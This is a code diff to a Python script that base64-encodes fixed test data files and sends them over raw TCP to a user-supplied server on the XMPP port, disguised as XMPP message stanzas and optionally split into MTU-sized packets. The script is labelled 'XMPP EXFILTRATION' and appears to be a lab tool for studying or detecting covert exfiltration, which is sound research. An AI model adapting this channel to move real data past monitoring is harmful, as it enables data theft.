@@ -1,11 +1,12 @@
-import slixmpp
-import asyncio
-import logging
+#!/usr/bin/python
+
+import argparse
 import socket
 from util.cborctl import CBORIterator, readFromFile
 from hashlib import sha256
 import base64
-logging.basicConfig(level=logging.DEBUG)
+import ipaddress
+import sys
 
 
 def getMessage(data: bytes):
@@ -31,16 +32,42 @@ def getMessageStr(data: str):
     return message
 
 
+parser = argparse.ArgumentParser()
+parser.add_argument("-l", "--Length", type=int, help = "Length of data to exfiltrate (1, 5, 10 MB)")
+parser.add_argument("-s", "--Segment", action="store_true", help = "Segement packets into Ethernet MTU sizes")
+parser.add_argument("-t", "--Target", help = "IP address of server to send exfiltration data to")
+args = parser.parse_args()
 
-SEG = True
+SEG = False
+if args.Segment == True: SEG = True
+
+size = int(args.Length)
+print(size)
+if size not in [1,5,10]:
+    print("Invalid exfiltration size!")
+    sys.exit(1)
+
+SERVER_IP = ""
+try:
+    ipaddress.ip_address(args.Target)
+except ValueError:
+    print("Invalid target server address!")
+    sys.exit(1)
+
+SERVER_IP = args.Target
 PSIZE = 1379
 
-content = readFromFile("data_1mb.json")    # bytes von CBOR speichern
-print(sha256(content).hexdigest())
+print("\n====================XMPP EXFILTRATION====================\n")
+
+info = "ON" if SEG else "OFF"
+print(f"Exfiltrating {size} MB with Segementing {info}")
+
+content = readFromFile(f"data_{size}mb.json")    # bytes von CBOR speichern
+print("Hash of CBOR-encoded content:\n" + sha256(content).hexdigest() + " (Check at receiver!)")
 
 b64content = base64.b64encode(content).decode()
 length = len(b64content)
-print(length)
+print("Length of payload bytestream (Base64 encoded): " + str(length) + "\n")
 
 test = """
     <message
@@ -63,11 +90,12 @@ crwaler = CBORIterator(content)
 # base 64 : 948 - Blöcke
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-    s.connect(("10.0.0.14", 5222))
+    s.connect((SERVER_IP, 5222))
     packet_counter = 0
     idx = 0
 
-    while length - idx >= PSIZE and SEG: # nicht genau
+    print("START sending packets")
+    while length - idx >= PSIZE and SEG: # nicht 100% genau
         packet = getMessageStr(b64content[idx:idx+PSIZE])
         output = packet.encode("utf-8")
         #print(len(output))
@@ -76,9 +104,11 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         idx += PSIZE
     
     packet = getMessageStr(b64content[idx:])
-    print(packet)
+    #print("Last packet sent: ")
+    #print(packet)
     output = packet.encode("utf-8")
-    print(len(output))
     s.send(output)
+    print("FINISHED sending packets")
     packet_counter += 1
+    print("Length of last packet: " + str(len(output)))
     print("Packets sent: " + str(packet_counter))
